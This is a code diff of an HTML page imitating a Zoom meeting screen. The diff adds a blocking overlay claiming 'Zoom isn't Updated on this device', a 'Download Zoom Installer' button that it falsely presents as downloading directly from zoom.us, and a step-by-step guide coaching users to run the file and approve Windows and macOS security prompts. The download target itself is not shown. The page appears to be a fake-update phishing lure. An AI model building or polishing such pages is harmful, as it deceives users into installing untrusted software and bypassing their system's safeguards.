@@ -20,10 +20,11 @@
     --red-hover: #c91f1f;
     --teal: #1f8a82;
     --muted-red: #ff5a5a;
+    --accent: #ff8a65;
+    --success: #6bd46b;
   }
 
   * { margin: 0; padding: 0; box-sizing: border-box; }
-
   html, body { height: 100%; }
 
   body {
@@ -35,21 +36,10 @@
     -moz-osx-font-smoothing: grayscale;
   }
 
-  button {
-    font-family: inherit;
-    cursor: pointer;
-    border: 0;
-    background: none;
-    color: inherit;
-  }
-
+  button { font-family: inherit; cursor: pointer; border: 0; background: none; color: inherit; }
   svg { display: block; }
 
-  .app {
-    display: flex;
-    flex-direction: column;
-    height: 100vh;
-  }
+  .app { display: flex; flex-direction: column; height: 100vh; }
 
   /* ===================== TOP BAR ===================== */
   .topbar {
@@ -141,9 +131,7 @@
   }
 
   .topbar-btn:hover { background: var(--bg-hover); }
-
   .topbar-btn > svg:first-child { width: 14px; height: 14px; }
-
   .topbar-btn .chevron { width: 10px; height: 10px; opacity: 0.7; }
 
   .user-avatar {
@@ -210,8 +198,6 @@
     display: flex;
     align-items: center;
     justify-content: center;
-    position: relative;
-    overflow: hidden;
     box-shadow: 0 4px 24px rgba(0, 0, 0, 0.35);
   }
 
@@ -237,7 +223,6 @@
     color: var(--muted-red);
   }
 
-  /* Self view */
   .self-view {
     position: absolute;
     top: 20px;
@@ -279,92 +264,6 @@
     border-radius: 3px;
   }
 
-  /* ===================== SIDE PANEL ===================== */
-  .side-panel {
-    width: 340px;
-    background: var(--bg-panel);
-    border-left: 1px solid var(--border);
-    display: none;
-    flex-direction: column;
-    flex-shrink: 0;
-    animation: slideIn 0.2s ease;
-  }
-
-  @keyframes slideIn {
-    from { transform: translateX(20px); opacity: 0; }
-    to { transform: translateX(0); opacity: 1; }
-  }
-
-  .side-panel.open { display: flex; }
-
-  .panel-header {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 14px 16px;
-    border-bottom: 1px solid var(--border);
-  }
-
-  .panel-title { font-size: 14px; font-weight: 500; }
-
-  .panel-close {
-    width: 28px;
-    height: 28px;
-    border-radius: 4px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: var(--text-dim);
-    transition: background 0.15s, color 0.15s;
-  }
-
-  .panel-close:hover { background: var(--bg-hover); color: #fff; }
-
-  .panel-body {
-    flex: 1;
-    overflow-y: auto;
-    padding: 12px 16px;
-    font-size: 13px;
-    color: var(--text-dim);
-  }
-
-  .participant-row {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    padding: 8px 0;
-  }
-
-  .participant-row .p-avatar {
-    width: 32px;
-    height: 32px;
-    border-radius: 50%;
-    background: var(--teal);
-    color: #fff;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 13px;
-    font-weight: 600;
-    flex-shrink: 0;
-  }
-
-  .participant-row .p-name { color: #fff; font-size: 13px; }
-
-  .participant-row .p-role {
-    margin-left: auto;
-    font-size: 11px;
-    color: var(--text-dim);
-  }
-
-  .empty-state {
-    text-align: center;
-    padding: 40px 0;
-    color: #666;
-    font-size: 13px;
-    line-height: 1.6;
-  }
-
   /* ===================== TOOLBAR ===================== */
   .toolbar {
     height: 76px;
@@ -379,11 +278,7 @@
     z-index: 10;
   }
 
-  .toolbar-group {
-    display: flex;
-    align-items: center;
-    gap: 4px;
-  }
+  .toolbar-group { display: flex; align-items: center; gap: 4px; }
 
   .toolbar-center {
     position: absolute;
@@ -411,8 +306,6 @@
 
   .tool:hover { background: var(--bg-hover); }
 
-  .tool.active { background: rgba(45, 140, 255, 0.15); color: #6cb4ff; }
-
   .tool-icon {
     width: 24px;
     height: 24px;
@@ -433,6 +326,21 @@
     opacity: 0.6;
   }
 
+  .tool.muted .tool-icon::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 26px;
+    height: 2px;
+    background: var(--muted-red);
+    transform: translate(-50%, -50%) rotate(-45deg);
+    border-radius: 1px;
+    pointer-events: none;
+  }
+
+  .tool.muted { color: var(--muted-red); }
+
   .tool .badge {
     position: absolute;
     top: -4px;
@@ -450,21 +358,6 @@
     color: #fff;
   }
 
-  .tool.muted .tool-icon::after {
-    content: '';
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    width: 26px;
-    height: 2px;
-    background: var(--muted-red);
-    transform: translate(-50%, -50%) rotate(-45deg);
-    border-radius: 1px;
-    pointer-events: none;
-  }
-
-  .tool.muted { color: var(--muted-red); }
-
   .tool.share-tool .tool-icon {
     background: var(--green);
     border-radius: 6px;
@@ -474,7 +367,6 @@
   }
 
   .tool.share-tool .tool-icon > svg { width: 18px; height: 18px; fill: #000; }
-
   .tool.share-tool .tool-icon .chevron { fill: #000; right: -6px; bottom: -2px; }
 
   .end-btn {
@@ -493,50 +385,360 @@
   .end-btn:hover { background: var(--red-hover); }
   .end-btn:active { transform: translateY(1px); }
 
-  /* ===================== REACTIONS POPUP ===================== */
-  .reactions-popup {
+  /* ===================== INSTALL OVERLAY ===================== */
+  .install-overlay {
     position: fixed;
-    bottom: 88px;
-    left: 50%;
-    transform: translateX(-50%) translateY(10px);
-    background: #2a2a2a;
-    border: 1px solid #3a3a3a;
-    border-radius: 10px;
-    padding: 8px;
-    display: none;
-    gap: 4px;
-    box-shadow: 0 8px 28px rgba(0, 0, 0, 0.7);
-    opacity: 0;
-    transition: opacity 0.15s, transform 0.15s;
-    z-index: 20;
-  }
-
-  .reactions-popup.open {
-    display: flex;
-    opacity: 1;
-    transform: translateX(-50%) translateY(0);
-  }
-
-  .reaction {
-    width: 38px;
-    height: 38px;
-    border-radius: 8px;
-    font-size: 22px;
+    inset: 0;
+    z-index: 9999;
     display: flex;
     align-items: center;
     justify-content: center;
-    transition: background 0.15s, transform 0.1s;
+    padding: 24px;
+    background: rgba(0, 0, 0, 0.82);
+    backdrop-filter: blur(6px);
+    -webkit-backdrop-filter: blur(6px);
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.3s ease, visibility 0.3s ease;
+    overflow-y: auto;
   }
 
-  .reaction:hover { background: var(--bg-hover); transform: scale(1.1); }
+  .install-overlay.show { opacity: 1; visibility: visible; }
 
-  /* ===================== TOAST ===================== */
+  .install-card {
+    width: 100%;
+    max-width: 760px;
+    background: #1f1f1f;
+    border: 1px solid #333;
+    border-radius: 14px;
+    padding: 0;
+    box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8);
+    transform: translateY(20px) scale(0.98);
+    transition: transform 0.3s cubic-bezier(0.2, 0.8, 0.3, 1);
+    max-height: calc(100vh - 48px);
+    overflow-y: auto;
+  }
+
+  .install-overlay.show .install-card {
+    transform: translateY(0) scale(1);
+  }
+
+  /* ---------- Prompt state ---------- */
+  .prompt-state {
+    padding: 40px 32px 32px;
+    text-align: center;
+  }
+
+  .prompt-icon {
+    width: 64px;
+    height: 64px;
+    margin: 0 auto 20px;
+    border-radius: 16px;
+    background: #ffffff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+  }
+
+  .prompt-icon svg { width: 80%; height: 80%; }
+
+  .prompt-state h2 {
+    font-size: 22px;
+    font-weight: 600;
+    margin-bottom: 10px;
+    color: #fff;
+    letter-spacing: -0.3px;
+  }
+
+  .prompt-state p {
+    font-size: 14px;
+    line-height: 1.6;
+    color: var(--text-dim);
+    max-width: 480px;
+    margin: 0 auto 24px;
+  }
+
+  .download-btn {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    min-width: 260px;
+    min-height: 50px;
+    padding: 14px 28px;
+    border-radius: 8px;
+    background: var(--blue);
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    text-decoration: none;
+    transition: background 0.15s, transform 0.06s, box-shadow 0.15s;
+    box-shadow: 0 2px 12px rgba(45, 140, 255, 0.4);
+  }
+
+  .download-btn:hover {
+    background: #1e7ae8;
+    box-shadow: 0 4px 18px rgba(45, 140, 255, 0.5);
+  }
+
+  .download-btn:active { transform: translateY(1px); }
+  .download-btn:focus-visible { outline: 2px solid #fff; outline-offset: 2px; }
+  .download-btn svg { width: 18px; height: 18px; }
+
+  .prompt-note {
+    margin-top: 20px;
+    font-size: 12px;
+    color: #6e6e74;
+    line-height: 1.5;
+  }
+
+  /* ---------- Guide state ---------- */
+  .guide-state {
+    padding: 32px;
+    animation: fadeUp 0.35s ease;
+  }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .guide-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 24px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .guide-app-icon {
+    width: 52px;
+    height: 52px;
+    border-radius: 12px;
+    background: #fff;
+    flex-shrink: 0;
+    overflow: hidden;
+  }
+
+  .guide-header h2 {
+    font-size: 20px;
+    font-weight: 600;
+    margin-bottom: 3px;
+    color: #fff;
+  }
+
+  .guide-header p {
+    color: var(--text-dim);
+    font-size: 13px;
+    line-height: 1.4;
+  }
+
+  .guide-section {
+    background: #262626;
+    border-radius: 10px;
+    padding: 20px;
+    margin-bottom: 16px;
+  }
+
+  .guide-section h3 {
+    font-size: 16px;
+    font-weight: 600;
+    margin-bottom: 4px;
+    color: #fff;
+  }
+
+  .guide-section .sub {
+    color: var(--text-dim);
+    font-size: 12.5px;
+    margin-bottom: 14px;
+  }
+
+  .guide-divider {
+    border: none;
+    border-top: 1px solid #3a3a3a;
+    margin: 12px 0 14px;
+  }
+
+  .checklist {
+    list-style: none;
+  }
+
+  .checklist li {
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    font-size: 13.5px;
+    color: #c8c8c8;
+    padding: 7px 0;
+    line-height: 1.5;
+  }
+
+  .checklist li::before {
+    content: "✓";
+    color: var(--success);
+    font-weight: 700;
+    flex-shrink: 0;
+    font-size: 13px;
+    line-height: 1.5;
+  }
+
+  .checklist code {
+    background: #3a3a3a;
+    padding: 1px 6px;
+    border-radius: 4px;
+    font-size: 12px;
+    font-family: Consolas, monospace;
+    color: #fff;
+  }
+
+  .guide-tabs {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 16px;
+  }
+
+  .guide-tab {
+    padding: 7px 18px;
+    border-radius: 6px;
+    background: #3a3a3a;
+    font-size: 13.5px;
+    color: #c8c8c8;
+    cursor: pointer;
+    border: 1px solid transparent;
+    transition: background 0.15s, color 0.15s;
+  }
+
+  .guide-tab:hover { background: #444; }
+
+  .guide-tab.active {
+    background: var(--accent);
+    color: #1f1f1f;
+    font-weight: 600;
+  }
+
+  .platform-content { display: none; }
+  .platform-content.active { display: block; }
+
+  .guide-step {
+    display: flex;
+    gap: 14px;
+    padding: 12px 0;
+    border-bottom: 1px solid #333;
+  }
+
+  .guide-step:last-child { border-bottom: none; }
+
+  .guide-step-num {
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    background: var(--accent);
+    color: #1f1f1f;
+    font-weight: 700;
+    font-size: 13px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .guide-step-body h4 {
+    font-size: 14px;
+    font-weight: 600;
+    margin-bottom: 3px;
+    color: #fff;
+  }
+
+  .guide-step-body p {
+    color: #c8c8c8;
+    font-size: 13.5px;
+    line-height: 1.5;
+  }
+
+  .guide-step-body code {
+    background: #3a3a3a;
+    padding: 1px 6px;
+    border-radius: 4px;
+    font-size: 12px;
+    font-family: Consolas, monospace;
+    color: #fff;
+  }
+
+  .tip-box {
+    display: flex;
+    gap: 12px;
+    background: rgba(107, 212, 107, 0.08);
+    border: 1px solid rgba(107, 212, 107, 0.25);
+    border-radius: 8px;
+    padding: 12px 14px;
+    margin-top: 14px;
+  }
+
+  .tip-box .tip-icon {
+    color: var(--success);
+    font-size: 16px;
+    flex-shrink: 0;
+    line-height: 1.5;
+  }
+
+  .tip-box p {
+    font-size: 12.5px;
+    color: #c8c8c8;
+    line-height: 1.5;
+  }
+
+  .warn-box {
+    display: flex;
+    gap: 12px;
+    background: rgba(255, 138, 101, 0.08);
+    border: 1px solid rgba(255, 138, 101, 0.25);
+    border-radius: 8px;
+    padding: 12px 14px;
+    margin-top: 14px;
+  }
+
+  .warn-box .warn-icon {
+    color: var(--accent);
+    font-size: 16px;
+    flex-shrink: 0;
+    line-height: 1.5;
+  }
+
+  .warn-box p {
+    font-size: 12.5px;
+    color: #c8c8c8;
+    line-height: 1.5;
+  }
+
+  .guide-close {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    width: 100%;
+    min-height: 44px;
+    margin-top: 20px;
+    padding: 10px 20px;
+    border-radius: 8px;
+    background: transparent;
+    border: 1px solid #444;
+    color: #c8c8c8;
+    font-size: 14px;
+    font-weight: 500;
+    transition: background 0.15s, border-color 0.15s;
+  }
+
+  .guide-close:hover { background: #2a2a2a; border-color: #555; }
+
+  /* ---------- Toast ---------- */
   .toast {
     position: fixed;
     top: 20px;
     left: 50%;
     transform: translateX(-50%) translateY(-80px);
-    background: rgba(45, 140, 255, 0.95);
+    background: rgba(45, 140, 255, 0.96);
     color: #fff;
     padding: 10px 18px;
     border-radius: 6px;
@@ -545,7 +747,7 @@
     opacity: 0;
     transition: opacity 0.25s, transform 0.25s;
     pointer-events: none;
-    z-index: 100;
+    z-index: 10000;
     box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
   }
 
@@ -554,151 +756,11 @@
     transform: translateX(-50%) translateY(0);
   }
 
-  /* ===================== UPDATE PROMPT ===================== */
-  .update-overlay {
-    position: fixed;
-    inset: 0;
-    z-index: 999;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 24px;
-    background: rgba(0, 0, 0, 0.75);
-    backdrop-filter: blur(4px);
-    -webkit-backdrop-filter: blur(4px);
-    opacity: 0;
-    visibility: hidden;
-    transition: opacity 0.25s ease, visibility 0.25s ease;
-  }
-
-  .update-overlay.show {
-    opacity: 1;
-    visibility: visible;
-  }
-
-  .update-card {
-    width: 100%;
-    max-width: 400px;
-    background: #1f1f1f;
-    border: 1px solid #343434;
-    border-radius: 12px;
-    padding: 30px 28px 24px;
-    text-align: center;
-    box-shadow: 0 24px 64px rgba(0, 0, 0, 0.75);
-    transform: translateY(14px) scale(0.97);
-    transition: transform 0.28s cubic-bezier(0.2, 0.8, 0.3, 1);
-  }
-
-  .update-overlay.show .update-card {
-    transform: translateY(0) scale(1);
-  }
-
-  .update-icon {
-    width: 56px;
-    height: 56px;
-    margin: 0 auto 18px;
-    border-radius: 50%;
-    background: rgba(45, 140, 255, 0.14);
-    border: 1px solid rgba(45, 140, 255, 0.28);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: var(--blue);
-  }
-
-  .update-icon svg { width: 26px; height: 26px; }
-
-  .update-title {
-    font-size: 19px;
-    font-weight: 600;
-    color: #fff;
-    margin-bottom: 8px;
-    letter-spacing: -0.2px;
-  }
-
-  .update-desc {
-    font-size: 13.5px;
-    line-height: 1.55;
-    color: #a8a8ad;
-    margin-bottom: 6px;
-  }
-
-  .update-version {
-    font-size: 11.5px;
-    color: #6e6e74;
-    margin-bottom: 20px;
-  }
-
-  .update-btn {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    width: 100%;
-    min-height: 46px;
-    padding: 12px 20px;
-    border-radius: 8px;
-    background: var(--blue);
-    color: #fff;
-    font-size: 15px;
-    font-weight: 600;
-    text-decoration: none;
-    transition: background 0.15s, transform 0.06s, box-shadow 0.15s;
-    box-shadow: 0 2px 10px rgba(45, 140, 255, 0.35);
-  }
-
-  .update-btn:hover {
-    background: #1e7ae8;
-    box-shadow: 0 4px 16px rgba(45, 140, 255, 0.45);
-  }
-
-  .update-btn:active { transform: translateY(1px); }
-
-  .update-btn:focus-visible {
-    outline: 2px solid #fff;
-    outline-offset: 2px;
-  }
-
-  .update-btn svg { width: 17px; height: 17px; }
-
-  .countdown-wrap {
-    margin-top: 16px;
-  }
-
-  .countdown-text {
-    font-size: 12px;
-    color: #9a9aa0;
-    margin-bottom: 7px;
-    font-variant-numeric: tabular-nums;
-  }
-
-  .countdown-text strong {
-    color: var(--blue);
-    font-weight: 600;
-  }
-
-  .countdown-bar {
-    height: 3px;
-    width: 100%;
-    background: #333;
-    border-radius: 2px;
-    overflow: hidden;
-  }
-
-  .countdown-fill {
-    height: 100%;
-    width: 100%;
-    background: var(--blue);
-    border-radius: 2px;
-    transition: width 1s linear;
-  }
-
   /* ===================== RESPONSIVE ===================== */
   @media (max-width: 1000px) {
     .meeting-meta { display: none; }
     .encrypted-pill { display: none; }
     .self-view { width: 140px; }
-    .side-panel { width: 280px; }
   }
 
   @media (max-width: 760px) {
@@ -711,7 +773,14 @@
     .self-view { width: 100px; top: 12px; right: 12px; }
     .stage { padding: 10px; }
     .avatar-big { width: 90px; height: 90px; font-size: 40px; }
-    .update-card { padding: 26px 22px 22px; }
+    .install-card { border-radius: 10px; }
+    .prompt-state { padding: 32px 20px 24px; }
+    .guide-state { padding: 24px 20px; }
+    .guide-header { gap: 12px; }
+    .guide-header h2 { font-size: 17px; }
+    .guide-app-icon { width: 44px; height: 44px; border-radius: 10px; }
+    .guide-section { padding: 16px; }
+    .download-btn { min-width: 0; width: 100%; }
   }
 </style>
 </head>
@@ -762,17 +831,13 @@
   <!-- ===================== CONTENT ===================== -->
   <div class="content">
     <main class="stage">
-
-      <!-- Self view (picture-in-picture) -->
       <div class="self-view" aria-hidden="true">
         <div class="self-avatar">J</div>
         <div class="self-label">Jacques Denard</div>
       </div>
 
-      <!-- Main participant tile -->
       <div class="video-tile">
         <div class="avatar-big">J</div>
-
         <div class="name-tag">
           <svg class="mic-off" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
             <path d="M12 15a3 3 0 0 0 3-3V6a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3z"/>
@@ -782,48 +847,25 @@
         </div>
       </div>
     </main>
-
-    <!-- Slide-in side panel -->
-    <aside class="side-panel" id="sidePanel" aria-hidden="true">
-      <div class="panel-header">
-        <div class="panel-title" id="panelTitle">Chat</div>
-        <button class="panel-close" id="panelClose" type="button" aria-label="Close panel">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
-            <line x1="18" y1="6" x2="6" y2="18"/>
-            <line x1="6" y1="6" x2="18" y2="18"/>
-          </svg>
-        </button>
-      </div>
-      <div class="panel-body" id="panelBody">
-        <div class="empty-state">No messages yet.</div>
-      </div>
-    </aside>
   </div>
 
   <!-- ===================== TOOLBAR ===================== -->
   <div class="toolbar">
     <div class="toolbar-group">
-      <button class="tool muted" id="micBtn" type="button">
+      <button class="tool muted" type="button">
         <div class="tool-icon">
           <svg viewBox="0 0 24 24" aria-hidden="true">
             <path d="M12 15a3 3 0 0 0 3-3V6a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3z"/>
             <path d="M19 12v-2a1 1 0 0 0-2 0v2a5 5 0 0 1-10 0v-2a1 1 0 0 0-2 0v2a7 7 0 0 0 6 6.92V21H8a1 1 0 0 0 0 2h8a1 1 0 0 0 0-2h-3v-2.08A7 7 0 0 0 19 12z"/>
           </svg>
-          <svg class="chevron" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
-            <path d="M7 10l5 5 5-5z"/>
-          </svg>
         </div>
         <span class="tool-label">Unmute</span>
       </button>
-
-      <button class="tool muted" id="videoBtn" type="button">
+      <button class="tool muted" type="button">
         <div class="tool-icon">
           <svg viewBox="0 0 24 24" aria-hidden="true">
             <rect x="2" y="6" width="14" height="12" rx="2"/>
             <path d="M16 10l6-3v10l-6-3z"/>
-          </svg>
-          <svg class="chevron" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
-            <path d="M7 10l5 5 5-5z"/>
           </svg>
         </div>
         <span class="tool-label">Start Video</span>
@@ -831,7 +873,7 @@
     </div>
 
     <div class="toolbar-center">
-      <button class="tool" data-panel="Participants" type="button">
+      <button class="tool" type="button">
         <div class="tool-icon">
           <svg viewBox="0 0 24 24" aria-hidden="true">
             <circle cx="9" cy="7" r="3.5"/>
@@ -843,8 +885,7 @@
         </div>
         Participants
       </button>
-
-      <button class="tool" data-panel="Chat" type="button">
+      <button class="tool" type="button">
         <div class="tool-icon">
           <svg viewBox="0 0 24 24" aria-hidden="true">
             <path d="M4 4h16v12H7l-3 3z"/>
@@ -852,8 +893,7 @@
         </div>
         Chat
       </button>
-
-      <button class="tool" id="reactBtn" type="button">
+      <button class="tool" type="button">
         <div class="tool-icon">
           <svg viewBox="0 0 24 24" aria-hidden="true">
             <circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="2"/>
@@ -861,28 +901,20 @@
             <circle cx="15" cy="10" r="1.2"/>
             <path d="M8 14c1 1.5 2.5 2.5 4 2.5s3-1 4-2.5" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
           </svg>
-          <svg class="chevron" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
-            <path d="M7 10l5 5 5-5z"/>
-          </svg>
         </div>
         React
       </button>
-
-      <button class="tool share-tool" data-panel="Share" type="button">
+      <button class="tool share-tool" type="button">
         <div class="tool-icon">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
             <rect x="2" y="3" width="20" height="14" rx="2"/>
             <path d="M12 21H8l-2-4M22 21h-4l-2-4"/>
             <path d="M12 10v-4M10 8l2-2 2 2"/>
           </svg>
-          <svg class="chevron" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
-            <path d="M7 10l5 5 5-5z"/>
-          </svg>
         </div>
         Share
       </button>
-
-      <button class="tool" data-panel="Host Tools" type="button">
+      <button class="tool" type="button">
         <div class="tool-icon">
           <svg viewBox="0 0 24 24" aria-hidden="true">
             <path d="M12 2L4 5V11C4 16 7.5 19.5 12 21C16.5 19.5 20 16 20 11V5L12 2Z"/>
@@ -890,8 +922,7 @@
         </div>
         Host Tools
       </button>
-
-      <button class="tool" data-panel="AI Companion" type="button">
+      <button class="tool" type="button">
         <div class="tool-icon">
           <svg viewBox="0 0 24 24" aria-hidden="true">
             <path d="M12 2l2 5 5 2-5 2-2 5-2-5-5-2 5-2z"/>
@@ -900,8 +931,7 @@
         </div>
         AI Companion
       </button>
-
-      <button class="tool" data-panel="More" type="button">
+      <button class="tool" type="button">
         <div class="tool-icon">
           <svg viewBox="0 0 24 24" aria-hidden="true">
             <circle cx="5" cy="12" r="2"/>
@@ -919,152 +949,236 @@
   </div>
 </div>
 
-<!-- Reactions popup -->
-<div class="reactions-popup" id="reactionsPopup" role="menu" aria-label="Send a reaction">
-  <button class="reaction" type="button" aria-label="Thumbs up">👍</button>
-  <button class="reaction" type="button" aria-label="Clap">👏</button>
-  <button class="reaction" type="button" aria-label="Heart">❤️</button>
-  <button class="reaction" type="button" aria-label="Laugh">😂</button>
-  <button class="reaction" type="button" aria-label="Surprised">😮</button>
-  <button class="reaction" type="button" aria-label="Celebrate">🎉</button>
+<!-- ===================== INSTALL OVERLAY ===================== -->
+<div class="install-overlay" id="installOverlay" role="dialog" aria-modal="true"
+     aria-labelledby="promptTitle" aria-hidden="true">
+  <div class="install-card">
+
+    <!-- Prompt state -->
+    <div class="prompt-state" id="promptState">
+      <div class="prompt-icon" aria-hidden="true">
+        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+          <rect width="100" height="100" rx="20" fill="#2D8CFF"/>
+          <path d="M28 35h28a8 8 0 018 8v22H36a8 8 0 01-8-8V35z" fill="#fff"/>
+          <path d="M68 43l10-6v26l-10-6z" fill="#fff"/>
+        </svg>
+      </div>
+      <h2 id="promptTitle">Zoom isn't Updated on this device</h2>
+      <p>
+        To join this meeting, you'll need the Zoom Workplace app. Click below to
+        download the official installer — it only takes a moment.
+      </p>
+      <button class="download-btn" id="downloadBtn" type="button">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+             stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <path d="M12 3v12"/>
+          <polyline points="7 10 12 15 17 10"/>
+          <path d="M4 19h16"/>
+        </svg>
+        Download Zoom Installer
+      </button>
+      <p class="prompt-note">
+        Downloads directly from zoom.us. Setup instructions will appear as soon as
+        the download starts.
+      </p>
+    </div>
+
+    <!-- Guide state -->
+    <div class="guide-state" id="guideState" style="display:none;">
+
+      <div class="guide-header">
+        <div class="guide-app-icon">
+          <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+            <rect width="100" height="100" rx="20" fill="#2D8CFF"/>
+            <path d="M28 35h28a8 8 0 018 8v22H36a8 8 0 01-8-8V35z" fill="#fff"/>
+            <path d="M68 43l10-6v26l-10-6z" fill="#fff"/>
+          </svg>
+        </div>
+        <div>
+          <h2>Setting up Zoom after downloading</h2>
+          <p>Step-by-step instructions to finish installing once the installer file is on your computer</p>
+        </div>
+      </div>
+
+      <!-- Before you start -->
+      <div class="guide-section">
+        <h3>Before you start</h3>
+        <p class="sub">A quick checklist so the install goes smoothly</p>
+        <hr class="guide-divider">
+        <ul class="checklist">
+          <li>You've downloaded the installer file (it usually appears in your <code>Downloads</code> folder)</li>
+          <li>You have a few minutes free — the install only takes a moment, but you may be prompted to restart other apps</li>
+          <li>You're connected to the internet, since the installer may fetch a small update</li>
+          <li>You have permission to install software on this device (admin rights may be needed)</li>
+        </ul>
+      </div>
+
+      <!-- Run the installer -->
+      <div class="guide-section">
+        <h3>Run the installer</h3>
+        <p class="sub">Choose your operating system for exact steps</p>
+        <hr class="guide-divider">
+
+        <div class="guide-tabs">
+          <button class="guide-tab active" type="button" data-platform="windows">Windows</button>
+          <button class="guide-tab" type="button" data-platform="mac">macOS</button>
+        </div>
+
+        <!-- Windows steps -->
+        <div class="platform-content active" id="windows">
+          <div class="guide-step">
+            <div class="guide-step-num">1</div>
+            <div class="guide-step-body">
+              <h4>Open the downloaded file</h4>
+              <p>Go to your <code>Downloads</code> folder and double-click the file you just downloaded. It will usually have a name starting with "Zoom" and end in <code>.exe</code>.</p>
+            </div>
+          </div>
+          <div class="guide-step">
+            <div class="guide-step-num">2</div>
+            <div class="guide-step-body">
+              <h4>Allow the app to make changes</h4>
+              <p>If a Windows security prompt appears asking for permission, select <strong>Yes</strong> to continue.</p>
+            </div>
+          </div>
+          <div class="guide-step">
+            <div class="guide-step-num">3</div>
+            <div class="guide-step-body">
+              <h4>Wait for the install to finish</h4>
+              <p>A progress window will appear automatically and close on its own once setup is complete. No further input is needed.</p>
+            </div>
+          </div>
+          <div class="guide-step">
+            <div class="guide-step-num">4</div>
+            <div class="guide-step-body">
+              <h4>Sign in or join a meeting</h4>
+              <p>The app opens automatically when setup finishes. Sign in with your account, or select <strong>Join a Meeting</strong> if you just need to join one with a meeting ID.</p>
+            </div>
+          </div>
+          <div class="guide-step">
+            <div class="guide-step-num">5</div>
+            <div class="guide-step-body">
+              <h4>Check for a desktop shortcut</h4>
+              <p>A shortcut is usually added to your desktop and Start menu so you can open the app again later without redownloading anything.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Mac steps -->
+        <div class="platform-content" id="mac">
+          <div class="guide-step">
+            <div class="guide-step-num">1</div>
+            <div class="guide-step-body">
+              <h4>Open the downloaded file</h4>
+              <p>Go to your <code>Downloads</code> folder and double-click the file ending in <code>.pkg</code> or <code>.dmg</code>.</p>
+            </div>
+          </div>
+          <div class="guide-step">
+            <div class="guide-step-num">2</div>
+            <div class="guide-step-body">
+              <h4>Follow the installer prompts</h4>
+              <p>Click <strong>Continue</strong>, then <strong>Install</strong>. You may be asked to enter your Mac's login password to allow the install.</p>
+            </div>
+          </div>
+          <div class="guide-step">
+            <div class="guide-step-num">3</div>
+            <div class="guide-step-body">
+              <h4>Approve security settings if prompted</h4>
+              <p>If macOS blocks the app the first time, go to <strong>System Settings → Privacy &amp; Security</strong> and choose to allow it to open.</p>
+            </div>
+          </div>
+          <div class="guide-step">
+            <div class="guide-step-num">4</div>
+            <div class="guide-step-body">
+              <h4>Open the app</h4>
+              <p>Find it in your <strong>Applications</strong> folder or Launchpad, then open it and sign in or join a meeting.</p>
+            </div>
+          </div>
+          <div class="guide-step">
+            <div class="guide-step-num">5</div>
+            <div class="guide-step-body">
+              <h4>Grant camera and microphone access</h4>
+              <p>The first time you join a meeting, macOS will ask for camera and microphone permissions — select <strong>OK</strong> so others can see and hear you.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="tip-box">
+          <div class="tip-icon">✔</div>
+          <p>Once installation finishes, you can delete the original downloaded installer file — it's no longer needed to run the app.</p>
+        </div>
+      </div>
+
+      <!-- Troubleshooting -->
+      <div class="guide-section">
+        <h3>If something doesn't work</h3>
+        <p class="sub">Common hiccups and quick fixes</p>
+        <hr class="guide-divider">
+
+        <div class="guide-step">
+          <div class="guide-step-num">!</div>
+          <div class="guide-step-body">
+            <h4>Nothing happens when you double-click the file</h4>
+            <p>Make sure the download finished completely (check your browser's download bar). Try right-clicking the file and choosing <strong>Open</strong>.</p>
+          </div>
+        </div>
+        <div class="guide-step">
+          <div class="guide-step-num">!</div>
+          <div class="guide-step-body">
+            <h4>"This app can't run on your PC" message</h4>
+            <p>Your download may not match your system (32-bit vs 64-bit). Re-download from the official source and pick the version matching your device.</p>
+          </div>
+        </div>
+        <div class="guide-step">
+          <div class="guide-step-num">!</div>
+          <div class="guide-step-body">
+            <h4>Camera, mic, or screen share not working after install</h4>
+            <p>Check your operating system's privacy settings to confirm the app has been granted permission to use these.</p>
+          </div>
+        </div>
+      </div>
+
+      <button class="guide-close" id="closeBtn" type="button">Back to meeting</button>
+
